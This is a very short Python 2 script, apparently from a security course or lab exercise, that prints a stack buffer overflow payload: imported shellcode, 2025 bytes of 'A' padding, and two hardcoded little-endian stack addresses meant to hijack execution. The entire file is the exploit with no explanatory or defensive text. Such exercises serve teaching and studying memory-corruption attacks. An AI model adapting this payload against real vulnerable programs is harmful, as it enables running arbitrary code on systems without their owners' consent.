from shellcode import shellcode 
from struct import pack 

print shellcode + "A"*2025  + pack("<I",0xbffe8290)+ pack("<I",0xbffe8ab8 ) 
